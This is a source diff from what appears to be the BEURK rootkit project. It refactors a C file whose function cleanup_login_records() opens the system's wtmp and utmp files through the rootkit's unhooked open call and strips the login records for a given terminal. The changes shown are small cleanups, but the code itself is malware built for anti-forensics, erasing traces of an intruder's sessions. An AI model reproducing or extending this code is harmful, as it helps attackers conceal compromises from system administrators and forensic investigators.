@@ -18,13 +18,11 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include "beurk.h"
 #include <string.h> /* memset() */
 #include <unistd.h> /* lseek(), read(), write(), close() */
-#include <stdlib.h> /* free() */
 #include <fcntl.h> /* O_RDWR */
-#include <utmp.h> /* struct utmp, UTMP_FILE, WTMP_FILE */
-
+#include <utmp.h> /* struct utmp */
+#include "beurk.h"
 
 /** hide utmp/wtmp records
  *
@@ -46,16 +44,18 @@ static void uwtmp_clean(struct utmp *utmp_entry, const char *pty_name, int fd) {
 }
 
 
+/** remove `pty_name` login records on utmp and wtmp files
+ */
 void    cleanup_login_records(const char *pty_name) {
-    DEBUG(D_INFO, "cleanup_login_records() called");
+    DEBUG(D_INFO, "called cleanup_login_records()");
     struct utmp     utmp_entry;
     int             fd;
 
-    fd = REAL_OPEN(WTMP_FILE, O_RDWR);
+    fd = REAL_OPEN(_WTMP_FILE, O_RDWR);
     if (fd > 0)
         uwtmp_clean(&utmp_entry, pty_name, fd);
 
-    fd = REAL_OPEN(UTMP_FILE, O_RDWR);
+    fd = REAL_OPEN(_UTMP_FILE, O_RDWR);
     if (fd > 0)
         uwtmp_clean(&utmp_entry, pty_name, fd);
 }
